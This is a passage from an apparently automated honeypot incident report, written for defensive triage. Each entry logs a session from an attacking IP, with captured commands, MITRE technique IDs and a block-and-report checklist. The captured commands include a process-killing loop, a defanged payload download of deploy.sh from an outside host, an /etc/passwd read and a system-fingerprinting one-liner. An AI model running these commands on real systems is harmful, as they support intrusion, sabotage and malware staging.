| `2026-07-28 14:32:41` | `cowrie.log.closed` |
| `2026-07-28 14:32:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d03aeeab6bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]18` |
| **First Seen** | 2026-07-28 14:32 |
| **Last Seen** | 2026-07-28 14:33 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo WRITABLE >/tmp/.testfile 2>&1, ls -l /tmp/.testfile 2>&1, rm -f /tmp/.testfile, cd /tmp, for pid in /proc/[0-9]*; do pid_num="${pid##*/}"; if [ -r "$pid/maps" ]; then suspicious=true; while IFS= read -r line; do case "$line" in *"/lib/"*|*"/lib64/"*|*".so"*) suspicious=false; break;; esac; done < "$pid/maps"; if [ "$suspicious" = true ]; then kill -9 "$pid_num" 2>/dev/null; fi; fi; done;` |
| **Download Attempts** | hxxp://91.199.133[.]133:8080/deploy.sh, hxxp://91.199.133[.]133:8080/deploy.sh, b5147693ed4a8744cd3c32e2a2b8c6ec77acc6c8f0494b994398161a0ba009c5 |
| **Malware Analysis** | 0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7 (LOW) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1105 · T1222.002 · T1489 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:32:41` | `cowrie.session.connect` |
| `2026-07-28 14:32:43` | `cowrie.login.success` |
| `2026-07-28 14:32:44` | `cowrie.session.params` |
| `2026-07-28 14:32:44` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:46` | `cowrie.command.input` |
| `2026-07-28 14:32:46` | `cowrie.command.input` |
| `2026-07-28 14:32:46` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.failed` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.session.file_download` |
| `2026-07-28 14:32:47` | `cowrie.session.file_download.failed` |
| `2026-07-28 14:32:47` | `cowrie.session.file_download` |
| `2026-07-28 14:33:07` | `cowrie.command.input` |
| `2026-07-28 14:33:09` | `cowrie.command.input` |
| `2026-07-28 14:33:10` | `cowrie.command.input` |
| `2026-07-28 14:33:10` | `cowrie.command.input` |
| `2026-07-28 14:33:10` | `cowrie.command.input` |
| `2026-07-28 14:33:10` | `cowrie.command.input` |
| `2026-07-28 14:33:11` | `cowrie.command.input` |
| `2026-07-28 14:33:11` | `cowrie.command.input` |
| `2026-07-28 14:33:11` | `cowrie.command.input` |
| `2026-07-28 14:33:11` | `cowrie.command.input` |
| `2026-07-28 14:33:11` | `cowrie.command.input` |
| `2026-07-28 14:33:11` | `cowrie.command.failed` |
| `2026-07-28 14:33:11` | `cowrie.command.failed` |
| `2026-07-28 14:33:11` | `cowrie.command.failed` |
| `2026-07-28 14:33:11` | `cowrie.command.failed` |
| `2026-07-28 14:33:36` | `cowrie.session.input` |
| `2026-07-28 14:33:38` | `cowrie.session.file_download` |
| `2026-07-28 14:33:38` | `cowrie.session.file_download` |
| `2026-07-28 14:33:38` | `cowrie.log.closed` |
| `2026-07-28 14:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]18` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21f5169324a5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:32 |
| **Last Seen** | 2026-07-28 14:32 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:32:42` | `cowrie.session.connect` |
| `2026-07-28 14:32:42` | `cowrie.client.version` |
| `2026-07-28 14:32:42` | `cowrie.client.kex` |
| `2026-07-28 14:32:44` | `cowrie.login.success` |
| `2026-07-28 14:32:45` | `cowrie.session.params` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.success` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:45` | `cowrie.command.input` |
| `2026-07-28 14:32:47` | `cowrie.log.closed` |
| `2026-07-28 14:32:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c56495f22d

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:33 |
| **Last Seen** | 2026-07-28 14:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:33:49` | `cowrie.session.connect` |
| `2026-07-28 14:33:49` | `cowrie.client.version` |
| `2026-07-28 14:33:49` | `cowrie.client.kex` |
| `2026-07-28 14:33:50` | `cowrie.login.success` |
| `2026-07-28 14:33:52` | `cowrie.session.params` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.success` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:52` | `cowrie.command.input` |
| `2026-07-28 14:33:53` | `cowrie.log.closed` |
| `2026-07-28 14:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5c3d89f3934

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:34 |
| **Last Seen** | 2026-07-28 14:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:34:57` | `cowrie.session.connect` |
| `2026-07-28 14:34:57` | `cowrie.client.version` |
| `2026-07-28 14:34:57` | `cowrie.client.kex` |
| `2026-07-28 14:34:58` | `cowrie.login.success` |
| `2026-07-28 14:35:00` | `cowrie.session.params` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.success` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.command.input` |
| `2026-07-28 14:35:00` | `cowrie.log.closed` |
| `2026-07-28 14:35:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d1f95fdc62c

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:36 |
| **Last Seen** | 2026-07-28 14:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:36:06` | `cowrie.session.connect` |
| `2026-07-28 14:36:07` | `cowrie.client.version` |
| `2026-07-28 14:36:07` | `cowrie.client.kex` |
| `2026-07-28 14:36:08` | `cowrie.login.success` |
| `2026-07-28 14:36:09` | `cowrie.session.params` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.success` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.command.input` |
| `2026-07-28 14:36:09` | `cowrie.log.closed` |
| `2026-07-28 14:36:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea25f74f7f51

| Field | Detail |
|---|---|
| **Source IP** | `107.173.67[.]180` |
| **First Seen** | 2026-07-28 14:36 |
| **Last Seen** | 2026-07-28 14:36 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:36:35` | `cowrie.session.connect` |
| `2026-07-28 14:36:37` | `cowrie.telnet.option` |
| `2026-07-28 14:36:38` | `cowrie.telnet.option` |
| `2026-07-28 14:36:38` | `cowrie.login.success` |
| `2026-07-28 14:36:38` | `cowrie.session.params` |
| `2026-07-28 14:36:40` | `cowrie.telnet.option` |
| `2026-07-28 14:36:40` | `cowrie.telnet.option` |
| `2026-07-28 14:36:40` | `cowrie.command.input` |
| `2026-07-28 14:36:40` | `cowrie.command.input` |
| `2026-07-28 14:36:40` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.failed` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.failed` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.failed` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:41` | `cowrie.command.input` |
| `2026-07-28 14:36:42` | `cowrie.log.closed` |
| `2026-07-28 14:36:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.173.67[.]180` to AbuseIPDB if not already reported
- [ ] Block `107.173.67[.]180` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9168432e78f0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:37 |
| **Last Seen** | 2026-07-28 14:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:37:15` | `cowrie.session.connect` |
| `2026-07-28 14:37:15` | `cowrie.client.version` |
| `2026-07-28 14:37:15` | `cowrie.client.kex` |
| `2026-07-28 14:37:16` | `cowrie.login.success` |
| `2026-07-28 14:37:18` | `cowrie.session.params` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.success` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.command.input` |
| `2026-07-28 14:37:18` | `cowrie.log.closed` |
| `2026-07-28 14:37:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-880381744fac

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:38 |
| **Last Seen** | 2026-07-28 14:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:38:24` | `cowrie.session.connect` |
| `2026-07-28 14:38:24` | `cowrie.client.version` |
| `2026-07-28 14:38:24` | `cowrie.client.kex` |
| `2026-07-28 14:38:25` | `cowrie.login.success` |
| `2026-07-28 14:38:27` | `cowrie.session.params` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.success` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.command.input` |
| `2026-07-28 14:38:27` | `cowrie.log.closed` |
| `2026-07-28 14:38:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69c85814a975

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 14:39 |
| **Last Seen** | 2026-07-28 14:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:39:29` | `cowrie.session.connect` |
| `2026-07-28 14:39:29` | `cowrie.client.version` |
| `2026-07-28 14:39:29` | `cowrie.client.kex` |
| `2026-07-28 14:39:30` | `cowrie.login.success` |
| `2026-07-28 14:39:30` | `cowrie.direct-tcpip.request` |
| `2026-07-28 14:39:30` | `cowrie.direct-tcpip.data` |
| `2026-07-28 14:39:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b8b4db5e90

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:39 |
| **Last Seen** | 2026-07-28 14:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:39:34` | `cowrie.session.connect` |
| `2026-07-28 14:39:34` | `cowrie.client.version` |
| `2026-07-28 14:39:34` | `cowrie.client.kex` |
| `2026-07-28 14:39:35` | `cowrie.login.success` |
| `2026-07-28 14:39:37` | `cowrie.session.params` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.success` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.command.input` |
| `2026-07-28 14:39:37` | `cowrie.log.closed` |
| `2026-07-28 14:39:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05af88a9561e

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:40 |
| **Last Seen** | 2026-07-28 14:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:40:46` | `cowrie.session.connect` |
| `2026-07-28 14:40:46` | `cowrie.client.version` |
| `2026-07-28 14:40:46` | `cowrie.client.kex` |
| `2026-07-28 14:40:48` | `cowrie.login.success` |
| `2026-07-28 14:40:49` | `cowrie.session.params` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.success` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.command.input` |
| `2026-07-28 14:40:49` | `cowrie.log.closed` |
| `2026-07-28 14:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]42` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c0c70768bbb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]42` |
| **First Seen** | 2026-07-28 14:41 |
| **Last Seen** | 2026-07-28 14:42 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 14:41:58` | `cowrie.session.connect` |
| `2026-07-28 14:41:59` | `cowrie.client.version` |
| `2026-07-28 14:41:59` | `cowrie.client.kex` |
| `2026-07-28 14:41:59` | `cowrie.login.success` |
| `2026-07-28 14:42:01` | `cowrie.session.params` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
| `2026-07-28 14:42:01` | `cowrie.command.input` |
